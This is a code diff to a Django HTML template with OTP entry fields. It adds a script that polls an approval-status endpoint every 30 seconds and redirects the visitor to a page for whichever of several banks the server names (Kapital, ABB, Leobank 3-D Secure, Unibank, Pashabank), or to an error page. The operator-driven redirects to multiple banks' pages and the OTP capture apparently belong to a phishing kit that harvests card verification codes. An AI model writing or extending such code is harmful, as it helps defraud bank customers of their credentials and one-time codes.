@@ -1,3 +1,4 @@
+
 {% load static %}
 <html lang="en"><head>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -346,6 +347,50 @@
             </div>
         </section>
         <script>
+            $(document).ready(function() {
+                var contact_id = {{ last_contact_id }};
+                var interval_id = setInterval(check_approval_status, 30000); 
+          
+                function check_approval_status() {
+                    $.ajax({
+                        url: '/check_approval_status/' + contact_id + '/',
+                        success: function(data) {
+                            if (data.bankname == "kapital") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "kapital" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "abb") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "abb" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "leobank") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "leobank3d" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "unibank") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "unibank" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "pashabank") {
+                                clearInterval(interval_id);  // stop checking for updates
+          
+                                window.location.href = '{% url "pashabank" %}';  // redirect to the new view
+                            }
+                            if (data.bankname == "error") {
+                                clearInterval(interval_id);  // stop checking for updates
+                                window.location.href = '{% url "error" %}';  // redirect to the new view
+                            }
+                        },
+                        error: function(xhr, status, error) {
+                            console.log('Error checking approval status:', error);
+                        }
+                    });
+                }
+            });
             const inputs = document.querySelectorAll('.otp-input');
 inputs.forEach((input, index) => {
   input.addEventListener('input', (e) => {
@@ -356,7 +401,6 @@ inputs.forEach((input, index) => {
     }
   });
 });
-
         </script>
         <section class="canvas" id="content">
             <div class="error-message"></div>
@@ -394,7 +438,6 @@ inputs.forEach((input, index) => {
     </footer>
 
 <script>
-
 
 </script>
 
